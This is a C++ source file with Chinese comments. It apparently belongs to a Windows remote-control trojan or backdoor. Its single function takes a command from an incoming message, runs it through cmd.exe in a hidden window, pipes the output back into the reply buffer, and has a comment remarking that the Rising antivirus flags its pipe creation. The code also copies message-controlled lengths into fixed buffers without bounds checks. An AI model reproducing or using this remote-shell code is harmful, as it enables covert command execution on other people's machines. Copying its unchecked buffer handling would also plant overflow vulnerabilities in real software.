#include "StdAfx.h"
#include "DosShell.h"
#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

//单管道Shell
void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;

	TCHAR Cmdline[256] = "cmd.exe /c ";     //命令行缓冲
	char ReadBuf[1024] = {0};    //发送缓冲
	SECURITY_ATTRIBUTES sa;     //安全描述符
	DWORD dwLen = 0, bytesRead = 0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道,被瑞星杀
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))  
	{
		lpMsgHead->dwCmd  = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if(hRead != NULL)
			CloseHandle(hRead);
		if(hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}

	si.cb=sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;    //进程（cmd）的输出写入管道
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	//GetSystemDirectory(Cmdline, sizeof(Cmdline));
	//lstrcat(Cmdline,"\\cmd.exe /c ");
	StrNCat(Cmdline, pBuf, lpMsgHead->dwSize+1);
	
	if (!CreateProcess(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) 
	{
		lpMsgHead->dwCmd  = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if(hRead != NULL)
			CloseHandle(hRead);
		if(hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}
	CloseHandle(hWrite);//这句不可省

	while (ReadFile(hRead, ReadBuf, 1024, &bytesRead, NULL))
	{
		//拼接数据
		memcpy(pBuf+dwLen, ReadBuf, bytesRead);
		dwLen += bytesRead;

		ZeroMemory(ReadBuf, 1024);
		
		Sleep(120);
	}

	lpMsgHead->dwCmd = 0;
	lpMsgHead->dwSize = dwLen;

	//释放句柄
	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);
}
